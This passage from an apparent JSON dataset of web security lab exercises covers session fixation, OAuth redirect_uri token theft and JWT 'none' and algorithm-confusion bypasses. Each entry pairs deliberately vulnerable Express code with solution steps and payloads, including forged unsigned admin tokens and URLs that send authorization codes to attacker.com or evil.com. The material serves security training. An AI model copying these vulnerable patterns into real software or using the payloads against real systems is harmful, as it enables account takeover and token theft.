    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.get('/login', (req, res) => { const session = req.query.session; res.cookie('session', session); res.send('<form method=\"POST\" action=\"/do-login\"><input name=\"user\"><input name=\"pass\"><input type=\"submit\"></form>'); }); app.post('/do-login', (req, res) => { res.redirect('/my-account'); }); app.get('/my-account', (req, res) => { if (req.cookies.session === 'fixed-session-abc') res.send('Carlos account page'); else res.send('Invalid session'); }); const PORT = 4001; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "http://lab-url/login?session=fixed-session-abc",
      "Cookie: session=fixed-session-abc"
    ]
  },
  {
    "Lab scenario": "OAuth Misconfiguration in Token Exchange Endpoint",
    "Lab Description": "The lab uses an OAuth provider for authentication but fails to validate the `redirect_uri` and `client_id` parameters. This enables an attacker to manipulate the authorization flow and exchange an arbitrary `code` for a victim’s token. To solve: Hijack an access token using a rogue redirect URI and access Carlos's account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to analyze the OAuth flow and observe the exchange between `/auth`, `/callback`, and `/token`.",
      "Craft a GET request to `/auth` with a malicious `redirect_uri` pointing to your domain (e.g., https://attacker.com/callback) and a valid `client_id`.",
      "Send the link to the victim to trigger an OAuth code grant. Capture the code on your rogue redirect endpoint.",
      "Send a POST request to `/token` with the captured code and your malicious `redirect_uri`, bypassing the verification logic.",
      "Use the received access token to call `/my-account` as the victim."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.use(express.urlencoded({ extended: true })); const validCodes = { 'authcode123': 'token-for-carlos' }; app.post('/token', (req, res) => { const { code, redirect_uri } = req.body; if (validCodes[code]) { res.json({ access_token: validCodes[code] }); } else { res.status(400).send('Invalid code'); } }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'token-for-carlos') res.send('Carlos account data'); else res.status(403).send('Access denied'); }); const PORT = 4002; app.listen(PORT, () => console.log(`OAuth Token Exchange Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "GET /auth?client_id=trusted-app&redirect_uri=https://attacker.com/callback",
      "POST /token { \"code\": \"authcode123\", \"redirect_uri\": \"https://attacker.com/callback\" }",
      "Authorization: Bearer token-for-carlos"
    ]
  },
  {
    "Lab scenario": "JWT signature verification bypass in Authorization middleware",
    "Lab Description": "The application uses JWTs for session management but fails to validate the token signature correctly when the `alg` header is set to 'none'. The backend simply decodes the payload and grants access without cryptographic verification. To solve: forge a valid token for the user 'admin' and access the /admin dashboard.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept a request after logging in with a normal user using Burp Suite and extract the JWT from the Authorization header.",
      "Decode the JWT using jwt.io and observe the alg field is set to 'HS256'. Modify it to 'none'.",
      "Craft a new payload with { \"user\": \"admin\" }, set alg to 'none', and leave the signature empty.",
      "Use Postman or Burp to send a request to /admin with the forged token in the Authorization header.",
      "Verify access to the admin dashboard and check for a flag or message confirming successful privilege escalation."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = [{ username: 'admin', role: 'admin' }, { username: 'user1', role: 'user' }]; const jwtSecret = 'supersecretkey'; app.use((req, res, next) => { const auth = req.headers.authorization; if (auth && auth.startsWith('Bearer ')) { const token = auth.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded && decoded.header.alg === 'none') { req.user = decoded.payload; return next(); } try { req.user = jwt.verify(token, jwtSecret); return next(); } catch (e) { return res.status(401).send('Invalid token'); } } res.status(401).send('No token provided'); }); app.get('/admin', (req, res) => { if (req.user && req.user.user === 'admin') { res.send('Welcome to the admin panel'); } else { res.status(403).send('Forbidden'); } }); app.listen(3000, () => console.log('JWT Lab running on port 3000'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
      "Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."
    ]
  },
  {
    "Lab scenario": "Open redirect in OAuth flow in redirect_uri parameter",
    "Lab Description": "This lab’s OAuth implementation contains an open redirect vulnerability in the `redirect_uri` parameter. The authorization server does not validate the redirect destination properly. To solve: steal the OAuth authorization code of another user by injecting a crafted redirect_uri that forwards the code to your attacker-controlled domain.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to proxy and observe the initial OAuth request sent to the authorization endpoint.",
      "Identify the redirect_uri parameter and test injecting a value like https://attacker.com/callback.",
      "Craft a phishing link to the victim using the modified redirect_uri to send the authorization code to your server.",
      "Deploy a basic listener (e.g., using ngrok or requestbin) and receive the stolen code.",
      "Manually exchange the stolen code for a token using Postman and access the victim’s resource."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/auth', (req, res) => { const { redirect_uri, response_type, client_id } = req.query; if (!redirect_uri || !response_type || !client_id) { return res.status(400).send('Missing parameters'); }  const authCode = 'AUTH12345'; res.redirect(`${redirect_uri}?code=${authCode}`); }); app.listen(4000, () => console.log('OAuth Redirection Lab running on port 4000'));",
    "payloads": [
      "https://victim.com/oauth/authorize?client_id=abc&redirect_uri=https://attacker.com/callback&response_type=code",
      "https://auth.vulnapp.com/auth?client_id=test&redirect_uri=https://evil.com&response_type=code"
    ]
  },
  {
    "Lab scenario": "Session fixation vulnerability in login endpoint via cookie injection",
    "Lab Description": "The login flow does not generate a new session upon authentication. This allows attackers to set a known session ID before login, then trick a victim into logging in with it. To solve: fixate a known session ID for Carlos and access /my-account using the same session ID.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to send a GET /login request with a custom session cookie (e.g., sessionid=abc123).",
      "Trick the victim into logging in while using this same session ID (simulate or assume they log in with that session cookie).",
      "Once authenticated, use the same session ID to access the authenticated user’s /my-account page.",
      "Confirm the session contains Carlos's data without re-authentication.",
      "Verify unauthorized access to account data and session reuse confirmation."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'supersecure' }]; let sessions = {}; app.get('/login', (req, res) => { const { username, password } = req.query; const user = users.find(u => u.username === username && u.password === password); if (user) { const sessId = req.cookies.sessionid; if (sessId) { sessions[sessId] = username; res.send('Logged in'); } else { res.status(400).send('Session ID missing'); } } else { res.send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.sessionid]; if (user) { res.send(`Account details for ${user}`); } else { res.status(403).send('Access Denied'); } }); app.listen(5000, () => console.log('Session Fixation Lab running on port 5000'));",
    "payloads": [
      "Cookie: sessionid=attackersession",
      "GET /login?username=carlos&password=supersecure HTTP/1.1\\nCookie: sessionid=attackersession",
      "GET /my-account HTTP/1.1\\nCookie: sessionid=attackersession"
    ]
  },
  {
    "Lab scenario": "Session fixation in login flow",
    "Lab Description": "This lab contains a session fixation vulnerability in the login flow. The application reuses the session identifier set prior to authentication. The application sets a session cookie before login and does not regenerate it upon successful authentication. To solve: log in as Carlos by leveraging a fixed session identifier to hijack his session.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite Proxy to capture a request to /login and note the session cookie set before logging in.",
      "Send the GET /login request to Burp Repeater. Log out and change the session cookie to match your original session.",
      "Craft a phishing link or client-side JS that forces the victim (Carlos) to log in while having your session ID.",
      "Wait or simulate a login by Carlos using your fixed session ID.",
      "Access /my-account with the hijacked session and confirm access to Carlos’s account page."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(session({ secret: 'fixme', resave: false, saveUninitialized: true })); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'pass123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.authenticated = true; req.session.username = username; res.redirect('/my-account'); } else { res.send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { if (req.session.authenticated) { res.send(`Welcome back, ${req.session.username}`); } else { res.status(401).send('Unauthorized'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "Set-Cookie: connect.sid=fixedSessionId;",
      "Phishing link: http://lab.com/login?sid=fixedSessionId",
      "Session reuse during victim login"
    ]
  },
  {
    "Lab scenario": "JWT token tampering via 'none' algorithm",
    "Lab Description": "This lab uses JSON Web Tokens (JWT) for user sessions but fails to enforce a valid signing algorithm. It accepts tokens signed with 'none', allowing users to forge tokens without a signature. To solve: Forge a JWT with 'admin' privileges and access the admin panel.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept a valid JWT using Burp Suite Proxy or Postman during a login.",
      "Decode the JWT using jwt.io and observe the algorithm is HS256.",
      "Modify the JWT header to use \"alg\":\"none\" and set payload to {\"username\":\"admin\",\"role\":\"admin\"}.",
      "Remove the signature portion of the JWT completely.",
      "Set the modified JWT in Authorization header and access /admin-panel."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const SECRET = 'topsecret'; const users = [{ username: 'admin', password: 'adminpass' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ username, role: 'admin' }, SECRET, { algorithm: 'HS256' }); res.json({ token }); } else { res.status(401).send('Unauthorized'); } }); app.get('/admin-panel', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; try { const decoded = jwt.verify(token, SECRET); if (decoded.role === 'admin') { res.send('Welcome to the admin panel'); } else { res.status(403).send('Forbidden'); } } catch { res.status(401).send('Invalid token'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT None Algorithm Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
      "Payload: {\"username\":\"admin\",\"role\":\"admin\"}",
      "JWT: <base64(header)>.<base64(payload)>."
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration with open redirect in redirect_uri",
    "Lab Description": "This lab implements OAuth 2.0 login using a third-party provider but fails to validate redirect_uri properly. An attacker can inject an external redirect to exfiltrate tokens. To solve: Steal an access token by exploiting an open redirect and use it to access Carlos’s profile page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP or Burp to capture the OAuth authorization URL.",
      "Modify the redirect_uri parameter to point to a domain you control (e.g., https://attacker.com/callback).",
      "Send a phishing link to the victim or simulate their login flow.",
      "Receive the access token on your callback endpoint.",
      "Replay the token to /profile using Authorization: Bearer <stolen_token> to access Carlos’s profile."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); const CLIENT_ID = 'abc123'; const REDIRECT_URIS = ['http://localhost:4000/callback']; app.get('/auth', (req, res) => { const redirect = req.query.redirect_uri; res.redirect(`https://oauth.provider.com/auth?client_id=${CLIENT_ID}&redirect_uri=${redirect}`); }); app.get('/callback', async (req, res) => { const { code } = req.query; const token = await axios.post('https://oauth.provider.com/token', { code }); res.send('Logged in with token: ' + token.data.access_token); }); app.get('/profile', (req, res) => { const auth = req.headers['authorization']; if (auth === 'Bearer supersecrettoken') { res.send('Carlos profile page'); } else { res.status(403).send('Access denied'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Redirect Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "https://lab.com/auth?redirect_uri=https://attacker.com/callback",
      "Captured Token: Bearer supersecrettoken",
      "Phishing link with poisoned redirect_uri"
    ]
  },
  {
    "Lab scenario": "Session Fixation in REST-based login flow",
    "Lab Description": "This lab implements RESTful authentication via session cookies but fails to regenerate the session ID upon successful login. The application incorrectly trusts session state established prior to login. To solve: Fixate a session for Carlos and gain access to his account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OWASP ZAP to initiate an unauthenticated session and capture the Set-Cookie header from GET /login",
      "Send multiple GET requests to confirm session ID is reused even after login",
      "Use Postman to manually log in as carlos while reusing the fixated session ID",
      "Observe that authentication completes without regenerating session ID, giving access",
      "Send GET /my-account with the fixated cookie and confirm access to Carlos's account"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); app.use(session({ secret: 'supersecret', resave: false, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'carlospass' }]; app.get('/login', (req, res) => { res.send('Login page'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = username; res.send('Logged in'); } else { res.status(401).send('Unauthorized'); } }); app.get('/my-account', (req, res) => { if (req.session.user === 'carlos') res.send('Carlos Account Access'); else res.status(403).send('Forbidden'); }); app.listen(4000);",
    "payloads": [
      "Session-ID reuse before and after POST /login",
      "GET /my-account with fixated session cookie",
      "POST /login with valid creds and pre-injected JSESSIONID"
    ]
  },
  {
    "Lab scenario": "JWT None Algorithm Authentication Bypass",
    "Lab Description": "The app uses JSON Web Tokens for user sessions but fails to validate the JWT signature algorithm properly. It accepts unsigned tokens if 'alg' is set to 'none'. To solve: Modify the JWT to impersonate Carlos without a valid signature and access the protected resource.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to capture a valid JWT token from your account login response",
      "Decode the token using jwt.io and observe the 'alg' header is RS256",
      "Replace 'alg' with 'none' and change 'sub' or 'username' field to carlos",
      "Strip the signature and construct a new token with header.payload.",
      "Send the tampered token in Authorization: Bearer header and access /account"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = [{ username: 'carlos', password: 'jwtpass' }]; const privateKey = 'PRIVATE_KEY'; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ username }, privateKey, { algorithm: 'RS256' }); res.json({ token }); } else { res.status(401).send('Invalid login'); } }); app.get('/account', (req, res) => { const auth = req.headers['authorization']; const token = auth?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.payload.username === 'carlos') res.send('Welcome Carlos'); else res.status(403).send('Access Denied'); }); app.listen(4000);",
    "payloads": [
      "JWT with header: {\"alg\":\"none\"}",
      "Payload: {\"username\":\"carlos\"}",
      "Authorization: Bearer header with unsigned JWT"
    ]
  },
  {
    "Lab scenario": "OAuth Misconfiguration with Open Redirect in Callback",
    "Lab Description": "This app uses OAuth2 with an authorization code grant flow. However, the redirect_uri parameter is not properly validated, allowing redirection to attacker-controlled domains. To solve: Steal the authorization code of Carlos via a crafted OAuth login URL and gain access to his token-protected account page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the OAuth redirect URL during login initiation",
      "Modify the redirect_uri to point to your public request bin or attacker server",
      "Send the crafted OAuth login link to the victim (Carlos)",
      "Capture the authorization code redirected to your server",
      "Exchange the stolen code for an access token and use it to call /account"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const querystring = require('querystring'); const app = express(); app.get('/auth', (req, res) => { const { redirect_uri } = req.query; const authCode = 'auth123'; res.redirect(redirect_uri + '?code=' + authCode); }); app.get('/token', (req, res) => { const { code } = req.query; if (code === 'auth123') res.json({ access_token: 'token-for-carlos' }); else res.status(403).send('Invalid code'); }); app.get('/account', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (token === 'token-for-carlos') res.send('Carlos OAuth Account'); else res.status(401).send('Unauthorized'); }); app.listen(4000);",
    "payloads": [
      "https://example.com/auth?client_id=123&redirect_uri=https://attacker.com/callback",
      "Captured code=auth123 from callback",
      "GET /token?code=auth123 -> extract access_token",
      "Authorization: Bearer token-for-carlos"
    ]
  },
  {
    "Lab scenario": "Session fixation vulnerability in login endpoint",
    "Lab Description": "The login functionality improperly trusts pre-authentication session tokens. The application fails to issue a new session identifier upon successful login. To solve: fixate a session ID before login and use it to access Carlos’s account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to capture the GET /login request before any login attempt.",
      "Observe that a session cookie (e.g., sessionId) is already issued before login.",
      "Send the login request for Carlos using valid credentials via Burp Repeater with the fixed sessionId still active.",
      "After successful login, reuse the same sessionId and send a GET request to /account.",
      "Verify successful account access via the authenticated session with the fixed session ID."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'letmein' }]; app.get('/login', (req, res) => { res.cookie('sessionId', 'static-session-id'); res.send('Login page'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { res.send('Logged in'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/account', (req, res) => { if (req.cookies.sessionId === 'static-session-id') res.send('Carlos account page'); else res.status(403).send('Access denied'); }); const PORT = 4000; app.listen(PORT, () => console.log('Session Fixation Lab running on http://localhost:' + PORT));",
    "payloads": [
      "Pre-assign sessionId=static-session-id before login",
      "Send POST /login with credentials and fixed sessionId",
      "Reuse fixed sessionId to access /account"
    ]
  },
  {
    "Lab scenario": "JWT tampering vulnerability in token verification endpoint",
    "Lab Description": "The application uses JSON Web Tokens (JWT) for authentication but fails to validate the algorithm field securely. The server accepts tokens with the algorithm set to 'none', leading to authentication bypass. To solve: forge a valid JWT that grants admin access without a signature.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to capture a valid JWT token from the Authorization header after a successful login.",
      "Decode the token using jwt.io and examine the payload and algorithm fields.",
      "Modify the payload to { \"username\": \"carlos\", \"role\": \"admin\" } and set the algorithm to 'none'.",
      "Remove the signature portion entirely and re-encode the header and payload using base64url.",
      "Use Postman to send a request with the forged token in the Authorization header and access /admin."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'supersecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username, role: 'user' }, secret); res.json({ token }); }); app.get('/admin', (req, res) => { const token = req.headers['authorization'].split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.payload.role === 'admin') { res.send('Welcome Admin'); } else { res.status(403).send('Forbidden'); } }); const PORT = 4000; app.listen(PORT, () => console.log('JWT None Algorithm Lab running on http://localhost:' + PORT));",
    "payloads": [
      "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
      "Payload: {\"username\":\"carlos\",\"role\":\"admin\"}",
      "JWT: base64url(header) + '.' + base64url(payload) + '.'"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration in implicit grant flow",
    "Lab Description": "The OAuth implementation uses the implicit flow with weak redirect URI validation, enabling token theft via open redirection. The application trusts redirect URIs from user input. To solve: craft a malicious redirect to steal Carlos’s access token.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to capture the initial OAuth request flow on login.",
      "Notice the redirect_uri parameter is weakly validated against an allowlist.",
      "Craft a new OAuth request with a redirect_uri pointing to a malicious site (e.g., https://attacker.com#access_token=...).",
      "Send the modified OAuth URL to Carlos or simulate a login as Carlos if credentials are known.",
      "Capture the access token from the redirect and use it to access Carlos’s data via the /userinfo endpoint."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const tokens = { 'carlos-token': 'carlos' }; app.get('/authorize', (req, res) => { const { response_type, client_id, redirect_uri } = req.query; if (response_type === 'token') { const token = 'carlos-token'; res.redirect(redirect_uri + '#access_token=' + token); } else { res.status(400).send('Unsupported flow'); } }); app.get('/userinfo', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (tokens[token]) res.send('User data for ' + tokens[token]); else res.status(403).send('Invalid token'); }); const PORT = 4000; app.listen(PORT, () => console.log('OAuth Misconfig Lab running on http://localhost:' + PORT));",
    "payloads": [
      "https://vulnerable-app.com/authorize?response_type=token&client_id=xyz&redirect_uri=https://attacker.com",
      "Captured token from redirect: #access_token=carlos-token",
      "GET /userinfo with Authorization: Bearer carlos-token"
    ]
  },
  {
    "Lab scenario": "JWT token signature verification bypass in login endpoint",
    "Lab Description": "The application's JWT authentication mechanism incorrectly trusts the 'alg' header provided by the client. The server uses a public key but does not enforce the expected algorithm. The application signs JWT tokens using RS256, but accepts tokens where the algorithm is changed to HS256. To solve: Craft a JWT with the alg header set to HS256 and sign it using the public key as the HMAC secret to impersonate Carlos.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept a valid login response and extract the JWT",
      "Decode the token using jwt.io or jwt_tool to inspect the headers and payload",
      "Change the alg field from RS256 to HS256 and modify the payload sub to 'carlos'",
      "Use the server's public key as the HMAC secret to sign the token using HS256",
      "Replace the original JWT in a request to /my-account and confirm access to Carlos's account"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.json()); const publicKey = fs.readFileSync('./public.pem'); app.post('/login', (req, res) => { const token = req.body.token; try { const decoded = jwt.verify(token, publicKey); if (decoded.sub) res.send(`Welcome ${decoded.sub}`); else res.status(403).send('Invalid token'); } catch (err) { res.status(403).send('Token verification failed'); } }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(401).send('No token'); const token = auth.split(' ')[1]; try { const decoded = jwt.verify(token, publicKey); if (decoded.sub === 'carlos') res.send('Carlos account page'); else res.status(403).send('Access denied'); } catch (err) { res.status(403).send('Token verification error'); } }); app.listen(4000);",
    "payloads": [
      "Header: {\"alg\":\"HS256\"}",
      "Payload: {\"sub\":\"carlos\"}",
      "Signature: HMAC(publicKey, base64Url(header) + '.' + base64Url(payload))"
    ]
  },
  {
    "Lab scenario": "Session fixation vulnerability in OAuth 2.0 callback handler",
    "Lab Description": "The OAuth implementation fails to generate a new session upon successful login. Attackers can craft a login URL with a fixed session ID and trick users into authenticating with it. The application binds the victim's account to an attacker-controlled session. To solve: Fixate a session for Carlos by generating a session ahead of time, initiating OAuth flow with that session, and capturing his authenticated session post-login.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman or Burp Suite to initiate a login and capture the Set-Cookie header containing the session ID",
      "Store that session ID and embed it in a crafted OAuth login URL as a Cookie header",
      "Send the crafted login URL to Carlos (simulated)",
      "After Carlos logs in via the link, reuse the fixed session ID to access his account",
      "Request /my-account using the fixed session cookie and verify the login was hijacked"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; app.get('/oauth/callback', (req, res) => { const { code, state } = req.query; const sessionId = req.cookies.session_id; if (sessionId) { sessions[sessionId] = { username: 'carlos' }; res.redirect('/my-account'); } else { res.status(400).send('No session'); } }); app.get('/my-account', (req, res) => { const sessionId = req.cookies.session_id; const session = sessions[sessionId]; if (session && session.username === 'carlos') res.send('Carlos account page'); else res.status(403).send('Not authorized'); }); app.listen(4000);",
    "payloads": [
      "GET /oauth/callback?code=abc123&state=xyz HTTP/1.1 with Cookie: session_id=fixed123",
      "Reuse Cookie: session_id=fixed123 to access /my-account"
    ]
  },
  {
    "Lab scenario": "Verbose error leakage in multi-step GraphQL auth process",
    "Lab Description": "The application's GraphQL login mutation leaks detailed error messages that help enumerate valid users and token states. The GraphQL API responds differently when incorrect usernames or passwords are provided. To solve: Enumerate a valid user, retrieve a temporary token from a leaked error, and escalate access via an unprotected token mutation.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to send multiple login GraphQL queries and observe differences in error messages",
      "Enumerate valid usernames based on verbose errors (e.g., 'User exists' vs 'Invalid username')",
      "Send a login request for the valid user with an incorrect password to retrieve the temporary token from the verbose error",
      "Use the token in a follow-up mutation to reset the password or authenticate directly",
      "Query myAccount with the new credentials to confirm successful exploitation"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = { 'carlos': { password: 'secret', tempToken: 'temp-123' } }; app.post('/graphql', (req, res) => { const { query } = req.body; if (query.includes('login')) { const usernameMatch = query.match(/username: \"(.*?)\"/); const passwordMatch = query.match(/password: \"(.*?)\"/); if (!usernameMatch) return res.json({ error: 'Missing username' }); const username = usernameMatch[1]; const password = passwordMatch[1]; if (!users[username]) return res.json({ error: 'Invalid username' }); if (users[username].password !== password) return res.json({ error: `Wrong password, use temp token: ${users[username].tempToken}` }); return res.json({ data: { login: { token: 'valid-token' } } }); } if (query.includes('myAccount')) { const tokenMatch = query.match(/token: \"(.*?)\"/); if (tokenMatch && tokenMatch[1] === 'valid-token') return res.json({ data: { myAccount: { username: 'carlos' } } }); return res.json({ error: 'Access denied' }); } res.json({ error: 'Invalid query' }); }); app.listen(4000);",
    "payloads": [
      "GraphQL login query: { login(username: \"carlos\", password: \"wrongpass\") }",
      "Extract leaked token: temp-123",
      "GraphQL mutation: { resetPassword(tempToken: \"temp-123\", newPassword: \"newpass\") }",
      "GraphQL login: { login(username: \"carlos\", password: \"newpass\") }",
      "GraphQL query: { myAccount(token: \"valid-token\") }"
    ]
  },
  {
    "Lab scenario": "Session Fixation in Login Flow",
    "Lab Description": "This lab's login flow is vulnerable to session fixation due to the reuse of session identifiers before and after authentication. The application issues a session ID on initial visit and fails to regenerate it after successful login. To solve: hijack Carlos's session using a pre-set session ID to access his account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept a GET / request to capture a new session cookie.",
      "Send the session cookie to Carlos via social engineering (simulate manually).",
      "Once Carlos logs in with the fixed session ID, reuse the same cookie to access his session.",
      "Browse to /account with the fixed cookie to verify session hijack.",
      "Confirm access to Carlos's data and solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(session({ secret: 'vulnsecret', resave: false, saveUninitialized: true })); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'pass123' }]; app.get('/', (req, res) => { res.send('Welcome to our site'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.username = username; res.redirect('/account'); } else { res.status(401).send('Login failed'); } }); app.get('/account', (req, res) => { if (req.session.username) { res.send(`User account for ${req.session.username}`); } else { res.status(403).send('Forbidden'); } }); app.listen(4000);",
    "payloads": [
      "Set-Cookie: connect.sid=fixedsessionid; Path=/; HttpOnly",
      "Reuse the session cookie after victim login",
      "Manual simulation of session fixation through social engineering"
    ]
  },
  {
    "Lab scenario": "JWT Signature None Algorithm Bypass",
    "Lab Description": "This lab uses JSON Web Tokens for session management. It improperly supports the 'none' algorithm and accepts unsigned tokens. The application uses JWTs stored in a cookie to manage sessions but fails to validate signatures correctly. To solve: craft a token for Carlos using the none algorithm and access his profile.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept JWT from an authenticated user using Burp Suite.",
      "Decode the token header and payload using jwt.io or similar.",
      "Replace the 'alg' field with 'none' and modify payload to impersonate 'carlos'.",
      "Remove the signature part and set the new JWT as a cookie in Burp.",
      "Send a request to /profile with the tampered JWT and confirm Carlos’s account access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos' }]; app.get('/profile', (req, res) => { const token = req.cookies.token; if (!token) return res.status(401).send('Unauthorized'); try { const decoded = jwt.verify(token, 'secretkey'); res.send(`Welcome ${decoded.username}`); } catch (err) { res.status(400).send('Invalid token'); } }); app.listen(4000);",
    "payloads": [
      "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
      "Payload: {\"username\":\"carlos\"}",
      "Unsigned token: base64(header).base64(payload).",
      "Set-Cookie: token=<tampered JWT>"
    ]
  },
  {
    "Lab scenario": "OAuth2 Redirect URI Manipulation",
    "Lab Description": "This lab integrates OAuth2 for social login but allows arbitrary redirection via open redirect in the redirect_uri parameter. The application does not validate the redirect URI domain properly. To solve: trick the app into redirecting to a malicious endpoint to steal Carlos’s token.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to proxy and observe the OAuth2 authorization flow.",
      "Identify the redirect_uri parameter used in the authorization request.",
      "Modify redirect_uri to point to an attacker-controlled site (exploit-server).",
      "Send phishing link to Carlos to initiate login using OAuth2 flow.",
      "Capture Carlos’s access token and use it to access /account endpoint."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const axios = require('axios'); const querystring = require('querystring'); const app = express(); app.get('/auth', (req, res) => { const redirectUri = req.query.redirect_uri; const url = `https://authserver.com/oauth/authorize?response_type=token&client_id=app123&redirect_uri=${redirectUri}`; res.redirect(url); }); app.get('/callback', (req, res) => { const token = req.query.access_token; if (token) { res.send(`Token received: ${token}`); } else { res.send('Login failed'); } }); app.listen(4000);",
    "payloads": [
      "redirect_uri=https://attacker.com/callback",
      "Authorization URL with malicious redirect",
      "access_token captured from redirected request"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion in API authorization",
